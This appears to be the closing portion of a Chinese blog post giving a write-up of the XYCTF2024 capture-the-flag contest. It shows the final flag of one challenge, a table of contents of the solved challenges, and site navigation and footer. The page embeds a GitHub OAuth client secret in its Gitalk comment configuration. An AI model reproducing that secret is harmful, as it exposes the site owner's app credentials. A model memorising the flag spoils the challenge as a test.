<p>那么最后的flag是：flag{L0v3_i8_a_k3y_and_memory_never_go_done_finally_thankyou_xiaowangtongxue}</p>
<img src="/2024/04/26/XYCTF2024-Writeup/%E8%88%94%E7%8B%97%E5%9B%9B%E9%83%A8%E6%9B%B2_%E6%88%91%E7%9A%84%E7%99%BD%E6%9C%88%E5%85%89_%E5%A4%AA%E7%97%9B%E4%BA%86.png" class title="舔狗四部曲_我的白月光_太痛了"></div>
        </div>
        
            <div class="kratos-copyright text-center clearfix">
                <h5 itemprop="copyrightNotice">本作品采用 <a rel="license nofollow" target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">知识共享署名-相同方式共享 4.0 国际许可协议</a> 进行许可</h5>
            </div>
        
        <footer class="kratos-entry-footer clearfix">
            
            <div class="footer-tag clearfix">
                <div class="pull-left">
                <i class="fa fa-tags"></i>
                    <a class="tag-none-link" href="/tags/CTF/" rel="tag">CTF</a>
                </div>
                <div class="pull-date">
                    <time datetime="2024-07-10T01:32:06.307Z" itemprop="dateModified">最后编辑：2024-07-10</time>
                </div>
            </div>
        </footer>
    </div>
    
        <nav class="navigation post-navigation clearfix" role="navigation">
            
            <div class="nav-previous clearfix">
                <a title=" JavaScript混淆与babel逆向" href="/2023/12/31/JavaScript混淆与babel逆向/">&lt; 上一篇</a>
            </div>
            
            
            <div class="nav-next clearfix">
                <a title=" 高校网络安全管理运维赛部分misc wp" href="/2024/05/06/高校网络安全管理运维赛部分misc-wp/">下一篇 &gt;</a>
            </div>
            
        </nav>
    
    
        <link rel="stylesheet" href="/vendors/gitalk@1.7.2/dist/gitalk.css"></script>
<div id="gitalk-container" class="post-comments lazy-load" style="padding-left:2rem; padding-right:2rem;"></div>
<script>
    var load_comm = () => {
        const init = () => {
            console.log('Gitalk loading...');
            const gitalk = new Gitalk(Object.assign({
                id: '37e2c7dc9638b59c1688d47ee3ff2f13',
                path: '/2024/04/26/XYCTF2024-Writeup/'
            }, JSON.parse('{"clientID":"263909d74813a540cbd5","clientSecret":"2281b95d2a4d3a7d298e387e940f9388e01883e5","repo":"jht3QAQ.github.io","owner":"jht3QAQ","admin":["jht3QAQ"],"distractionFreeMode":false}')));

            gitalk.render('gitalk-container');
        }
        if (typeof Gitalk === 'undefined') {
            const src = '/vendors/gitalk@1.7.2/dist/gitalk.min.js';
            $.getScript(src, init);
        } else {
            init();
        }
    };
</script>
<noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="https://github.com/gitalk/gitalk">comments powered by Gitalk.</a></noscript>
    
</article>

        

            </section>

        

                
            

<section id="kratos-widget-area" class="col-md-4 hidden-xs hidden-sm">
    <!-- 文章和页面根据splitter来分割，没有的话就从头开始设置为sticky -->
    
    
                <aside id="krw-about" class="widget widget-kratos-about clearfix">
    <div class="photo-background"></div>
    <div class="photo-wrapper clearfix">
        <div class="photo-wrapper-tip text-center">
            <img class="about-photo" src="/images/70e16d9eb5a85bcc.jpg" loading="lazy" decoding="auto" />
        </div>
    </div>
    <div class="textwidget">
        <p class="text-center"></p>
    </div>
    <div class="site-meta">
        <a class="meta-item" href="/archives/">
            <span class="title">
                文章
            </span>
            <span class="count">
                4
            </span>
        </a>
        <a class="meta-item" href="/categories/">
            <span class="title">
                分类
            </span>
            <span class="count">
                0
            </span>
        </a>
        <a class="meta-item" href="/tags/">
            <span class="title">
                标签
            </span>
            <span class="count">
                10
            </span>
        </a>
    </div>
</aside>
            
                    <div class="sticky-area">
                
                    <aside id="krw-toc" class="widget widget-kratos-toc clearfix toc-div-class" >
    <div class="photo-background"></div>
    <h4 class="widget-title no-after">
        <i class="fa fa-compass"></i>
        文章目录
        <span class="toc-progress-bar" role="progressbar" aria-label="阅读进度："></span>
    </h4>
    <div class="textwidget">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC"><span class="toc-text">1. MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Rosk-Paper-Scissors"><span class="toc-text">1.1. Rosk,Paper,Scissors!</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#game"><span class="toc-text">1.2. game</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%91%E7%9A%84%E4%BA%8C%E7%BB%B4%E7%A0%81%E4%B8%BA%E5%95%A5%E6%89%AB%E4%B8%8D%E5%87%BA%E6%9D%A5%EF%BC%9F"><span class="toc-text">1.3. 我的二维码为啥扫不出来？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#zzl%E7%9A%84%E6%8A%A4%E7%90%86%E5%B0%8F%E8%AF%BE%E5%A0%82"><span class="toc-text">1.4. zzl的护理小课堂</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-%E9%9A%90%E5%86%99"><span class="toc-text">1.5. ez_隐写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%86%8A%E5%8D%9A%E5%A3%AB"><span class="toc-text">1.6. 熊博士</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ZIP%E7%A5%9E%E4%B9%8B%E5%A5%97"><span class="toc-text">1.7. ZIP神之套</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BA%E9%A2%98%E6%9C%89%E7%82%B9%E7%83%A6"><span class="toc-text">1.8. 出题有点烦</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9C%9F-%E7%AD%BE%E5%88%B0"><span class="toc-text">1.9. 真&gt;签到</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0"><span class="toc-text">1.10. 签到</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TCPL"><span class="toc-text">1.11. TCPL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E8%BF%BD%E8%B8%AA"><span class="toc-text">1.12. 网络追踪</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Osint1"><span class="toc-text">1.13. Osint1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Osint2"><span class="toc-text">1.14. Osint2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EZ-Base1024-2"><span class="toc-text">1.15. EZ_Base1024*2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ez-osint"><span class="toc-text">1.16. Ez_osint</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-text">2. Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#happy-to-solve1"><span class="toc-text">2.1. happy_to_solve1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Sign1n-%E7%AD%BE%E5%88%B0"><span class="toc-text">2.2. Sign1n[签到]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Sign1n-Revenge"><span class="toc-text">2.3. Sign1n_Revenge</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN"><span class="toc-text">3. PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#hello-world-%E7%AD%BE%E5%88%B0"><span class="toc-text">3.1. hello_world(签到)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#invisible-flag"><span class="toc-text">3.2. invisible_flag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fmt"><span class="toc-text">3.3. fmt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#static-link"><span class="toc-text">3.4. static_link</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#one-byte"><span class="toc-text">3.5. one_byte</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#guestbook1"><span class="toc-text">3.6. guestbook1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#simple-srop"><span class="toc-text">3.7. simple_srop</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EZ1-0"><span class="toc-text">3.8. EZ1.0?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EZ2-0"><span class="toc-text">3.9. EZ2.0?</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-text">4. Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%A2%E7%89%A2%E8%AE%B0%E4%BD%8F%EF%BC%8C%E9%80%9D%E8%80%85%E4%B8%BA%E5%A4%A7"><span class="toc-text">4.1. 牢牢记住，逝者为大</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#warm-up"><span class="toc-text">4.2. warm up</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezMake"><span class="toc-text">4.3. ezMake</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezhttp"><span class="toc-text">4.4. ezhttp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezmd5"><span class="toc-text">4.5. ezmd5</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse"><span class="toc-text">5. Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Trustme"><span class="toc-text">5.1. Trustme</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DebugMe"><span class="toc-text">5.2. DebugMe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#baby-unity"><span class="toc-text">5.3. baby unity</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-unity"><span class="toc-text">5.4. ez unity</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%A0%E6%98%AF%E7%9C%9F%E7%9A%84%E5%A4%A7%E5%AD%A6%E7%94%9F%E5%90%97%EF%BC%9F"><span class="toc-text">5.5. 你是真的大学生吗？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%96%B5%E5%96%B5%E5%96%B5%E7%9A%84flag%E7%A2%8E%E4%BA%86%E4%B8%80%E5%9C%B0"><span class="toc-text">5.6. 喵喵喵的flag碎了一地</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%81%AA%E6%98%8E%E7%9A%84%E4%BF%A1%E4%BD%BF"><span class="toc-text">5.7. 聪明的信使</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8A%E5%A4%95%E6%98%AF%E4%BD%95%E5%B9%B4"><span class="toc-text">5.8. 今夕是何年</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezmath"><span class="toc-text">5.9. ezmath</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-enc"><span class="toc-text">5.10. ez_enc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-rand"><span class="toc-text">5.11. ez_rand</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%95%E9%A1%BB%E7%9B%B8%E6%80%9D%E7%85%AE%E4%BD%99%E5%B9%B4"><span class="toc-text">5.12. 何须相思煮余年</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A0%B8%E6%A0%B8%E6%A1%83"><span class="toc-text">5.13. 砸核桃</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#What%E2%80%99s-this"><span class="toc-text">5.14. What’s this</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Findme"><span class="toc-text">5.15. Findme</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-cube"><span class="toc-text">5.16. ez_cube</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-language"><span class="toc-text">5.17. easy language</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%99%E9%98%BF%E5%A7%A8%E5%80%92%E4%B8%80%E6%9D%AF%E5%8D%A1%E5%B8%83%E5%A5%87%E8%AF%BA"><span class="toc-text">5.18. 给阿姨倒一杯卡布奇诺</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A6%92%E5%A4%B4"><span class="toc-text">5.19. 馒头</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%88%94%E7%8B%97%E5%9B%9B%E9%83%A8%E6%9B%B2%E2%80%93%E7%AE%80%E7%88%B1"><span class="toc-text">5.20. 舔狗四部曲–简爱</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%88%94%E7%8B%97%E5%9B%9B%E9%83%A8%E6%9B%B2%E2%80%93%E7%9B%B8%E9%80%A2%E5%B7%B2%E6%98%AF%E4%B8%8A%E4%B8%8A%E7%AD%BE"><span class="toc-text">5.21. 舔狗四部曲–相逢已是上上签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%88%94%E7%8B%97%E5%9B%9B%E9%83%A8%E6%9B%B2%E2%80%93%E8%AE%B0%E5%BF%86%E7%9A%84%E6%97%B6%E5%85%89%E6%9C%BA"><span class="toc-text">5.22. 舔狗四部曲–记忆的时光机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%88%94%E7%8B%97%E5%9B%9B%E9%83%A8%E6%9B%B2%E2%80%93%E6%88%91%E7%9A%84%E7%99%BD%E6%9C%88%E5%85%89"><span class="toc-text">5.23. 舔狗四部曲–我的白月光</span></a></li></ol></li></ol>
    </div>
</aside>
                
                

            
                
  <aside id="krw-tags" class="widget widget-kratos-tags clearfix">
    <h4 class="widget-title"><i class="fa fa-tags"></i>标签聚合</h4>
      <div class="tag-clouds">
        <a href="/tags/AST/" style="font-size: 0.6em;">AST</a> <a href="/tags/CTF/" style="font-size: 0.8em;">CTF</a> <a href="/tags/JavaScript/" style="font-size: 0.6em;">JavaScript</a> <a href="/tags/QAuxiliary/" style="font-size: 0.6em;">QAuxiliary</a> <a href="/tags/Redmi-Note12T-Pro/" style="font-size: 0.6em;">Redmi Note12T Pro</a> <a href="/tags/babel/" style="font-size: 0.6em;">babel</a> <a href="/tags/obfuscator/" style="font-size: 0.6em;">obfuscator</a> <a href="/tags/root/" style="font-size: 0.6em;">root</a> <a href="/tags/%E5%93%94%E5%93%A9%E6%BC%AB%E6%B8%B8/" style="font-size: 0.6em;">哔哩漫游</a> <a href="/tags/%E5%B0%8F%E7%B1%B3/" style="font-size: 0.6em;">小米</a>
      </div>
  </aside>

            
                
  <aside id="krw-posts" class="widget widget-kratos-posts">
  <h4 class="widget-title"><i class="fa fa-file"></i>最新文章</h4>
  <div class="tab-content">
      <ul class="list-group">
        
        
          
          
            <a class="list-group-item" href="/2024/05/06/%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B%E9%83%A8%E5%88%86misc-wp/"><i class="fa  fa-book"></i> 高校网络安全管理运维赛部分misc wp</a>
            
          
        
          
          
            <a class="list-group-item" href="/2024/04/26/XYCTF2024-Writeup/"><i class="fa  fa-book"></i> XYCTF2024 Writeup</a>
            
          
        
          
          
            <a class="list-group-item" href="/2023/12/31/JavaScript%E6%B7%B7%E6%B7%86%E4%B8%8Ebabel%E9%80%86%E5%90%91/"><i class="fa  fa-book"></i> JavaScript混淆与babel逆向</a>
            
          
        
          
          
            <a class="list-group-item" href="/2023/12/18/%E7%BA%A2%E7%B1%B3Note-12T-Pro%E4%BD%BF%E7%94%A8%E4%BD%93%E9%AA%8C/"><i class="fa  fa-book"></i> 红米Note 12T Pro使用体验</a>
            
          
        
      </ul>
  </div>
  </aside>

            
    </div>
</section>
        
        </div>
    </div>
</div>
<footer>
    <div id="footer"  >
        <div class="container">
            <div class="row">
                <div class="col-md-6 col-md-offset-3 footer-list text-center">
                    <ul class="kratos-social-icons">
                        <!-- Keep for compatibility -->
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        <!-- New links -->
                        
                    </ul>
                    <ul class="kratos-copyright">
                        <div>
                            <li>&copy; 2024 jht3の个人站 版权所有.</li>
                            <li>本站已运行<span id="span_dt">Loading...</span></li>
                        </div>
                        <div>
                            <li>Theme <a href="https://github.com/Candinya/Kratos-Rebirth" target="_blank">Kratos:Rebirth</a></li>
                            <li>Site built with&nbsp;<i class="fa fa-heart throb" style="color:#d43f57"></i>&nbsp;by jht3.</li>
                        </div>
                        <div>
                            <li>Powered by <a href="https://hexo.io" target="_blank" rel="nofollow">Hexo</a></li>
                            <li>Hosted on <a href="https://github.io" target="_blank">Github Pages</a></li>
                        </div>
                        <div>
                            <li><a href="https://icp.gov.moe/?keyword=20240011" rel="external nofollow" target="_blank">萌ICP备20240011号</a></li>
                            
                        </div>
                    </ul>
                </div>
            </div>
        </div>
        <div class="kr-tool text-center">
            <div class="tool">
                
                    <div class="box search-box">
                        <a href="/search/">
                            <span class="fa fa-search"></span>
                        </a>
                    </div>
                
                
                    <div class="box theme-box" id="darkmode-switch">
                        <span class="fa fa-adjust"></span>
                    </div>
                
                
                    <div class="box theme-box" id="snow-switch">
                        <span class="fa fa-snowflake-o"></span>
                    </div>
                
                
            </div>
            <div class="box gotop-box">
                <span class="fa fa-chevron-up"></span>
            </div>
        </div>
    </div>
</footer>
</div>
</div>

        <script defer src="/vendors/bootstrap@3.3.4/dist/js/bootstrap.min.js"></script>
<script defer src="/vendors/nprogress@0.2.0/nprogress.js"></script>
<script>
    if (!window.kr) {
        window.kr = {};
    }
    window.kr.notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));
    window.kr.siteRoot = "/";
</script>

    <div>
        <canvas id="snow"></canvas>
        <script async src="/js/snow.min.js"></script>
    </div>


    <script async src="/js/candy.min.js"></script>




    <script defer src="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>

<script defer src="/js/kratosr.min.js"></script>
<script defer src="/js/pjax.min.js"></script>



<!-- Extra support for third-party plguins  -->


    </body>
</html>